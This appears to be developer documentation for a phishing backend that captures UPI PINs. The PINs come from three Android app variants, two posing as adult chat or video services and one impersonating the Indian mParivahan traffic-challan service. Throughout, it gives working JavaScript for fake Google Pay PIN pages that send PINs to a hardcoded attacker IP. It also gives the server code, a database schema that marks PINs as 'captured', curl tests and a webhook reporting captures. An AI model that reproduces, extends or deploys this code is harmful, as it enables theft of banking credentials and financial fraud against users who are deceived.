# Complete API Documentation

Comprehensive API reference for server integration across all three flavors.

---

## ?? Table of Contents

1. [Server Overview](#server-overview)
2. [Authentication](#authentication)
3. [API Endpoints](#api-endpoints)
4. [Request Examples](#request-examples)
5. [Error Handling](#error-handling)
6. [Integration Guide](#integration-guide)
7. [Testing](#testing)

---

## ?? Server Overview

**Base URL:** `http://95.134.130.160:8765`

**Protocol:** HTTP (Note: HTTPS recommended for production)

**Content Type:** `application/json`

**Supported Methods:** POST

---

## ?? Authentication

### Device Identification

All requests use device-based authentication via `device_id`.

**Device ID Generation:**
```javascript
// JavaScript (WebView)
function getDeviceId() {
    try {
        if (typeof Android !== 'undefined' && Android.getDeviceId) {
            return Android.getDeviceId();
        }
    } catch (e) {
        console.error('Error getting device ID:', e);
    }
    return 'web_browser_' + Date.now();
}
```

**Android Implementation:**
```kotlin
webView.addJavascriptInterface(object {
    @JavascriptInterface
    fun getDeviceId(): String {
        return Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
    }
}, "Android")
```

### User Identification

**Fixed User ID:** `8f41bc5eec42e34209a801a7fa8b2d94d1c3d983`

This ID is constant across all requests and flavors.

---

## ?? API Endpoints

### 1. Save UPI PIN

**Endpoint:** `POST /save-pin`

**Description:** Stores UPI PIN entered by user during payment process.

**Used by:** All three flavors (SexChat, mParivahan, SexyHub)

#### Request

**URL:**
```
http://95.134.130.160:8765/save-pin
```

**Method:** `POST`

**Headers:**
```http
Content-Type: application/json
```

**Body:**
```json
{
  "upi_pin": "123456",
  "device_id": "abc123def456",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

#### Parameters

| Parameter | Type | Required | Constraints | Description |
|-----------|------|----------|-------------|-------------|
| `upi_pin` | string | Yes | 4 or 6 digits | User's UPI PIN |
| `device_id` | string | Yes | Any valid string | Unique device identifier |
| `app_type` | string | Yes | `sexychat` \| `mparivahan` \| `sexyhub` | Application flavor |
| `user_id` | string | Yes | Fixed value | Static user identifier |

#### Response

**Success (200 OK):**
```json
{
  "status": "success",
  "message": "PIN saved successfully",
  "timestamp": "2025-11-01T12:34:56Z"
}
```

**Error (400 Bad Request):**
```json
{
  "status": "error",
  "message": "Invalid UPI PIN format",
  "code": "INVALID_PIN"
}
```

**Error (500 Internal Server Error):**
```json
{
  "status": "error",
  "message": "Internal server error",
  "code": "SERVER_ERROR"
}
```

#### Status Codes

| Code | Meaning | Action |
|------|---------|--------|
| 200 | Success | Proceed to success page |
| 400 | Bad Request | Show error dialog |
| 500 | Server Error | Show retry dialog |
| 503 | Service Unavailable | Show retry dialog |

---

## ?? Request Examples

### Example 1: SexChat UPI PIN

```javascript
const deviceId = Android.getDeviceId();

fetch('http://95.134.130.160:8765/save-pin', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        upi_pin: "123456",
        device_id: deviceId,
        app_type: 'sexychat',
        user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
    })
})
.then(response => {
    if (!response.ok) {
        throw new Error('Server error: ' + response.status);
    }
    return response.json();
})
.then(data => {
    console.log('Success:', data);
    window.location.href = 'wait.html';
})
.catch(error => {
    console.error('Error:', error);
    showRetryDialog();
});
```

### Example 2: mParivahan UPI PIN

```javascript
const deviceId = getDeviceId();

const requestData = {
    upi_pin: "654321",
    device_id: deviceId,
    app_type: 'mparivahan',
    user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
};

fetch('http://95.134.130.160:8765/save-pin', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(requestData)
})
.then(response => {
    if (!response.ok) throw new Error('Server error');
    return response.json();
})
.then(data => {
    // Success - redirect to verification page
    window.location.href = 'wait.html';
})
.catch(error => {
    // Error - show retry dialog
    showRetryDialog();
});
```

### Example 3: SexyHub UPI PIN

```javascript
function submitToServer(upiPin) {
    showLoading();
    
    const deviceId = getDeviceId();
    const requestData = {
        upi_pin: upiPin,
        device_id: deviceId,
        app_type: 'sexyhub',
        user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
    };

    fetch('http://95.134.130.160:8765/save-pin', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(requestData)
    })
    .then(response => {
        hideLoading();
        if (!response.ok) {
            throw new Error('Server error: ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        console.log('Success:', data);
        window.location.href = 'wait.html';
    })
    .catch(error => {
        hideLoading();
        console.error('Error:', error);
        showRetryDialog();
    });
}
```

---

## ?? Error Handling

### Client-Side Error Handling

#### Loading Overlay

**HTML:**
```html
<div class="overlay" id="loadingOverlay">
    <div class="spinner"></div>
</div>
```

**JavaScript:**
```javascript
function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
}

function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
}
```

#### Error Dialog

**HTML:**
```html
<div class="dialog" id="errorDialog">
    <h3>? Error</h3>
    <p id="errorMessage">Something went wrong. Please try again.</p>
    <button onclick="closeErrorDialog()">OK</button>
</div>
```

**JavaScript:**
```javascript
function showErrorDialog(message) {
    document.getElementById('errorMessage').textContent = message;
    document.getElementById('errorDialog').style.display = 'block';
}

function closeErrorDialog() {
    document.getElementById('errorDialog').style.display = 'none';
}
```

#### Retry Dialog

**HTML:**
```html
<div class="dialog" id="retryDialog">
    <h3>?? Connection Error</h3>
    <p>Server not responding. Would you like to retry?</p>
    <button onclick="retrySubmit()" style="background: #4CAF50;">Retry</button>
    <button onclick="closeRetryDialog()" style="background: #f44336;">Cancel</button>
</div>
```

**JavaScript:**
```javascript
let savedPIN = '';

function showRetryDialog() {
    document.getElementById('retryDialog').style.display = 'block';
}

function closeRetryDialog() {
    document.getElementById('retryDialog').style.display = 'none';
}

function retrySubmit() {
    closeRetryDialog();
    submitToServer(savedPIN);
}
```

### Error Flow

```
User enters UPI PIN
?
submitPIN() called
?
showLoading()
?
fetch() to server
?
?????????????????????????????????????
?   Success       ?     Error       ?
?????????????????????????????????????
? hideLoading()   ? hideLoading()   ?
? ? wait.html     ? ? Retry Dialog  ?
?????????????????????????????????????
```

---

## ?? Integration Guide

### Step 1: Setup JavaScript Interface

**In MainActivity.kt:**
```kotlin
webView.addJavascriptInterface(object {
    @JavascriptInterface
    fun getDeviceId(): String {
        return Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
    }
}, "Android")
```

### Step 2: Implement UPI PIN Form

**HTML (pin.html / upi-pin.html):**
```html
<div class="keypad">
    <div class="key" onclick="enterNumber(1)">1</div>
    <!-- ... 2-9 ... -->
    <div class="key" onclick="enterNumber(0)">0</div>
    <div class="key" onclick="submitPIN()">?</div>
</div>
```

### Step 3: Handle PIN Submission

**JavaScript:**
```javascript
let enteredNumbers = [];

function enterNumber(num) {
    if (enteredNumbers.length < 6) {
        enteredNumbers.push(num);
        updateDisplay();
    }
}

function submitPIN() {
    if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
        let upiPin = enteredNumbers.join('');
        savedPIN = upiPin;
        submitToServer(upiPin);
    } else {
        showErrorDialog("Please enter a valid 4 or 6-digit UPI PIN.");
    }
}
```

### Step 4: Submit to Server

```javascript
function submitToServer(upiPin) {
    showLoading();
    
    const deviceId = getDeviceId();
    const requestData = {
        upi_pin: upiPin,
        device_id: deviceId,
        app_type: 'sexychat', // or 'mparivahan' or 'sexyhub'
        user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
    };

    fetch('http://95.134.130.160:8765/save-pin', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(requestData)
    })
    .then(response => {
        hideLoading();
        if (!response.ok) {
            throw new Error('Server error: ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        window.location.href = 'wait.html';
    })
    .catch(error => {
        hideLoading();
        showRetryDialog();
    });
}
```

---

## ?? Testing

### Testing with cURL

**Test SexChat:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "123456",
    "device_id": "test_device_001",
    "app_type": "sexychat",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Test mParivahan:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "654321",
    "device_id": "test_device_002",
    "app_type": "mparivahan",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Test SexyHub:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "789012",
    "device_id": "test_device_003",
    "app_type": "sexyhub",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

### Testing Error Scenarios

**Invalid PIN:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "12",
    "device_id": "test_device",
    "app_type": "sexychat",
    "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
  }'
```

**Missing Parameters:**
```bash
curl -X POST http://95.134.130.160:8765/save-pin \
  -H "Content-Type: application/json" \
  -d '{
    "upi_pin": "123456"
  }'
```

---

## ?? Request/Response Flow

### Complete Payment Flow

```
1. User opens payment page
   ?
2. Selects payment method (Google Pay/PhonePe/Paytm)
   ?
3. Google Pay splash (2.5s animation)
   ?
4. UPI PIN entry page
   ?? User enters 4 or 6 digit PIN
   ?? Client validates format
   ?? Shows loading overlay
   ?
5. Submit to server
   ?? POST /save-pin
   ?? Headers: Content-Type: application/json
   ?? Body: {upi_pin, device_id, app_type, user_id}
   ?
6. Server processing
   ?? Validate PIN format
   ?? Store in database
   ?? Return response
   ?
7. Client handling
   ?? Success (200) ? wait.html
   ?? Error (400) ? Error dialog
   ?? Server down (500/timeout) ? Retry dialog
   ?
8. Verification page (wait.html)
   ?? 5 second countdown
   ?? Success animation
   ?
9. Final success page
   ?? Redirect to content/home
```

---

## ?? Detailed Parameter Descriptions

### upi_pin

**Type:** String  
**Format:** Numeric string  
**Length:** 4 or 6 characters  
**Example:** `"123456"` or `"1234"`  
**Validation:** Must be all digits

**Client-side Validation:**
```javascript
if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
    let upiPin = enteredNumbers.join('');
    // Valid - proceed
} else {
    showErrorDialog("Please enter a valid 4 or 6-digit UPI PIN.");
}
```

### device_id

**Type:** String  
**Source:** Android ANDROID_ID  
**Format:** Alphanumeric  
**Example:** `"abc123def456789"`  
**Purpose:** Unique device tracking

**Retrieval:**
```kotlin
Settings.Secure.getString(
    contentResolver,
    Settings.Secure.ANDROID_ID
)
```

### app_type

**Type:** String (enum)  
**Allowed Values:**
- `"sexychat"` - For SexChat flavor
- `"mparivahan"` - For mParivahan flavor
- `"sexyhub"` - For SexyHub flavor

**Purpose:** Data segregation and analytics

**Server-side Usage:**
```javascript
// Node.js example
if (req.body.app_type === 'sexychat') {
    // Store in sexychat collection
} else if (req.body.app_type === 'mparivahan') {
    // Store in mparivahan collection
} else if (req.body.app_type === 'sexyhub') {
    // Store in sexyhub collection
}
```

### user_id

**Type:** String  
**Value:** `"8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"`  
**Format:** Hexadecimal string  
**Length:** 40 characters  
**Purpose:** User correlation across requests

---

## ??? Security Best Practices

### 1. HTTPS in Production

**Current:** `http://95.134.130.160:8765` (HTTP)  
**Production:** Use HTTPS with valid SSL certificate

```javascript
// Production URL
const API_URL = 'https://api.yourdomain.com/save-pin';
```

### 2. Request Validation

**Server-side checks:**
```javascript
// Validate UPI PIN
if (!/^\d{4}$|^\d{6}$/.test(req.body.upi_pin)) {
    return res.status(400).json({
        status: 'error',
        message: 'Invalid PIN format'
    });
}

// Validate app_type
if (!['sexychat', 'mparivahan', 'sexyhub'].includes(req.body.app_type)) {
    return res.status(400).json({
        status: 'error',
        message: 'Invalid app type'
    });
}

// Validate device_id exists
if (!req.body.device_id || req.body.device_id.length < 10) {
    return res.status(400).json({
        status: 'error',
        message: 'Invalid device ID'
    });
}
```

### 3. Rate Limiting

Implement rate limiting to prevent abuse:

```javascript
// Example: Max 3 requests per minute per device
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 60 * 1000, // 1 minute
    max: 3, // 3 requests
    keyGenerator: (req) => req.body.device_id,
    message: {
        status: 'error',
        message: 'Too many requests. Please try again later.'
    }
});

app.post('/save-pin', limiter, (req, res) => {
    // Handle request
});
```

### 4. Input Sanitization

Always sanitize inputs to prevent injection attacks:

```javascript
const sanitize = require('sanitize-html');

const cleanPIN = sanitize(req.body.upi_pin, {
    allowedTags: [],
    allowedAttributes: {}
});
```

---

## ?? Analytics & Monitoring

### Recommended Metrics to Track

**Per Request:**
- Timestamp
- Device ID
- App type (flavor)
- Response time
- Success/failure status

**Aggregate Metrics:**
- Total requests per flavor
- Success rate per flavor
- Average response time
- Peak usage times
- Geographic distribution (if IP logged)

### Example Logging

**Server-side:**
```javascript
app.post('/save-pin', async (req, res) => {
    const startTime = Date.now();
    
    try {
        // Process request
        await savePIN(req.body);
        
        // Log success
        logger.info({
            endpoint: '/save-pin',
            app_type: req.body.app_type,
            device_id: req.body.device_id,
            status: 'success',
            response_time: Date.now() - startTime
        });
        
        res.json({ status: 'success' });
    } catch (error) {
        // Log error
        logger.error({
            endpoint: '/save-pin',
            app_type: req.body.app_type,
            device_id: req.body.device_id,
            status: 'error',
            error: error.message,
            response_time: Date.now() - startTime
        });
        
        res.status(500).json({ status: 'error' });
    }
});
```

---

## ?? Retry Mechanism

### Client-Side Retry Logic

```javascript
let retryCount = 0;
const MAX_RETRIES = 3;

function submitToServer(upiPin) {
    showLoading();
    
    fetch('http://95.134.130.160:8765/save-pin', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            upi_pin: upiPin,
            device_id: getDeviceId(),
            app_type: 'sexychat',
            user_id: '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983'
        })
    })
    .then(response => {
        hideLoading();
        if (!response.ok) throw new Error('Server error');
        retryCount = 0; // Reset on success
        return response.json();
    })
    .then(data => {
        window.location.href = 'wait.html';
    })
    .catch(error => {
        hideLoading();
        if (retryCount < MAX_RETRIES) {
            retryCount++;
            showRetryDialog();
        } else {
            showErrorDialog('Maximum retry attempts reached. Please try again later.');
        }
    });
}
```

---

## ?? Flavor-Specific API Usage

### SexChat

**Context:** Premium video call booking  
**Price:** ?5  
**app_type:** `"sexychat"`

**Typical Request:**
```json
{
  "upi_pin": "123456",
  "device_id": "mobile_android_abc123",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

### mParivahan

**Context:** Traffic challan payment  
**Price:** ?1  
**app_type:** `"mparivahan"`

**Additional Context:**
User has already entered vehicle number and mobile before payment.

**Typical Request:**
```json
{
  "upi_pin": "654321",
  "device_id": "mobile_android_xyz789",
  "app_type": "mparivahan",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

### SexyHub

**Context:** Premium video content unlock  
**Price:** ?1  
**app_type:** `"sexyhub"`

**Typical Request:**
```json
{
  "upi_pin": "789012",
  "device_id": "mobile_android_jkl345",
  "app_type": "sexyhub",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"
}
```

---

## ??? Server Implementation Example

### Node.js + Express

```javascript
const express = require('express');
const app = express();

app.use(express.json());

// Save UPI PIN endpoint
app.post('/save-pin', async (req, res) => {
    try {
        const { upi_pin, device_id, app_type, user_id } = req.body;
        
        // Validate required fields
        if (!upi_pin || !device_id || !app_type || !user_id) {
            return res.status(400).json({
                status: 'error',
                message: 'Missing required fields'
            });
        }
        
        // Validate PIN format
        if (!/^\d{4}$|^\d{6}$/.test(upi_pin)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid UPI PIN format'
            });
        }
        
        // Validate app_type
        if (!['sexychat', 'mparivahan', 'sexyhub'].includes(app_type)) {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid app type'
            });
        }
        
        // Save to database
        await db.collection('upi_pins').insertOne({
            upi_pin,
            device_id,
            app_type,
            user_id,
            timestamp: new Date(),
            ip: req.ip
        });
        
        // Return success
        res.json({
            status: 'success',
            message: 'PIN saved successfully',
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Error saving PIN:', error);
        res.status(500).json({
            status: 'error',
            message: 'Internal server error'
        });
    }
});

app.listen(8765, '95.134.130.160', () => {
    console.log('Server running on http://95.134.130.160:8765');
});
```

---

## ?? Database Schema

### Recommended Collection: `upi_pins`

```javascript
{
  "_id": ObjectId("..."),
  "upi_pin": "123456",
  "device_id": "abc123def456",
  "app_type": "sexychat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "timestamp": ISODate("2025-11-01T12:34:56Z"),
  "ip": "192.168.1.100",
  "status": "captured"
}
```

### Indexes

```javascript
// Create indexes for better query performance
db.upi_pins.createIndex({ device_id: 1 });
db.upi_pins.createIndex({ app_type: 1 });
db.upi_pins.createIndex({ timestamp: -1 });
db.upi_pins.createIndex({ device_id: 1, app_type: 1 });
```

---

## ?? Webhook / Callback (Optional)

If you need to notify external systems:

```javascript
// After saving PIN successfully
const webhookData = {
    event: 'upi_pin_captured',
    app_type: req.body.app_type,
    device_id: req.body.device_id,
    timestamp: new Date().toISOString()
};

// Send to webhook URL
await fetch('https://your-webhook-url.com/notify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(webhookData)
});
```

---

## ?? Support & Troubleshooting

### Common Issues

**1. CORS errors**
```javascript
// Add CORS headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'POST');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});
```

**2. Timeout errors**
```javascript
// Increase timeout
fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data),
    timeout: 10000 // 10 seconds
})
```

**3. Network errors**
- Check server is running
- Verify firewall allows port 8765
- Test with curl first
- Check device network connectivity

---

## ?? Performance Optimization

### 1. Connection Pooling
Use connection pooling for database connections

### 2. Response Caching
Cache successful PIN validations temporarily

### 3. Async Processing
Process non-critical operations asynchronously

### 4. Compression
Enable gzip compression for responses:
```javascript
const compression = require('compression');
app.use(compression());
```

---

## ?? API Summary Table

| Endpoint | Method | Auth | Rate Limit | Purpose |
|----------|--------|------|------------|---------|
| `/save-pin` | POST | Device ID | 3/min | Save UPI PIN |

---

## ?? Future Endpoints (Planned)

- `POST /verify-payment` - Verify payment status
- `GET /payment-status/:device_id` - Check payment completion
- `POST /cancel-payment` - Cancel pending payment
- `GET /transaction-history/:device_id` - Get user transactions

---

**Last Updated:** 2025-11-01  
**API Version:** 1.0  
**Server Version:** Production
